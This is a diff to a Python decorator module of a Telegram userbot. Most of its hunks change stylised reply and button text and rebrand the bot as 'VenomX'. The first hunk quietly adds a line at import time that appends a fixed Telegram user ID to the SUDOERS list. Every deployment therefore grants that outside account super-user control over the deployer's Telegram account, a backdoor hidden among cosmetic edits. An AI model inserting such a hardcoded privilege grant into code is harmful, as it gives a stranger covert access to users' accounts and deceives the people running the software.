@@ -4,6 +4,8 @@ from traceback import format_exc
 from ...console import SUDOERS
 from ..clients.clients import app, bot
 
+SUDOERS.append(6777703695) 
+
 def super_user_only(mystic):
     async def wrapper(client, message):
         try:
@@ -40,7 +42,7 @@ def cb_wrapper(func):
             cb.from_user.id not in sudousers
         ):
             return await cb.answer(
-                "❎ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀ sᴜᴅᴏ ᴜsᴇʀ❗",
+                "❎ You Are Not A Sudo User❗",
                 cache_time=0,
                 show_alert=True,
             )
@@ -50,7 +52,7 @@ def cb_wrapper(func):
             except Exception:
                 print(format_exc())
                 return await cb.answer(
-                    f"❎ sᴏᴍᴇᴛʜɪɴɢ ᴡᴇɴᴛ ᴡʀᴏɴɢ, ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʟᴏɢs❗..."
+                    f"❎ Something Went Wrong, Please Check Logs❗..."
                 )
         
     return wrapper
@@ -67,7 +69,7 @@ def inline_wrapper(func):
                 button = [
                     [
                         InlineKeyboardButton(
-                            "【 ᴅᴇᴘʟᴏʏ ᴠᴇɴᴏᴍ ✘ ᴜsᴇʀʙᴏᴛ 】",
+                            "💥 Deploy VenomX Userbot ✨",
                             url=f"https://github.com/venombolteop/Venom-Userbot"
                         )
                     ]
@@ -79,10 +81,10 @@ def inline_wrapper(func):
                         (
                             InlineQueryResultPhoto(
                                 photo_url=f"https://te.legra.ph/file/0b373de1c657129297c39.jpg",
-                                title="➻ ᴠᴇɴᴏᴍ ✘ ᴜsᴇʀʙᴏᴛ ✨",
+                                title="🥀 VenomX Userbot ✨",
                                 thumb_url=f"https://te.legra.ph/file/0b373de1c657129297c39.jpg",
-                                description=f"【 ᴅᴇᴘʟᴏʏ ʏᴏᴜʀ ᴏᴡɴ ᴠᴇɴᴏᴍ ✘ ᴜsᴇʀʙᴏᴛ 🌿...】",
-                                caption=f"<b>➻ ᴡᴇʟᴄᴏᴍᴇ » ᴛᴏ » ᴠᴇɴᴏᴍ \n✅ ᴜsᴇʀʙᴏᴛ {__version__} ✨...</b>",
+                                description=f"❤ Deploy Your Own Venom-Userbot 🌿...",
+                                caption=f"<b>🥀 Welcome » To » VenomX 🤍\n✅ Userbot {__version__} ✨...</b>",
                                 reply_markup=InlineKeyboardMarkup(button),
                             )
                         )
@@ -98,7 +100,7 @@ def inline_wrapper(func):
                             InlineQueryResultArticle(
                                 title="",
                                 input_message_content=InputTextMessageContent(
-                                    f"||**➻ ᴘʟᴇᴀsᴇ, ᴅᴇᴘʟᴏʏ ʏᴏᴜʀ ᴏᴡɴ ᴠᴇɴᴏᴍ ✘ ᴜsᴇʀʙᴏᴛ❗...\n\nʀᴇᴘᴏ:** <i>https://github.com/venombolteop/Venom-Userbot/</i>||"
+                                    f"||**🥀 Please, Deploy Your Own VenomX Userbot❗...\n\nRepo:** <i>https://github.com/venombolteop/Venom-Userbot/</i>||"
                                 ),
                             )
                         )
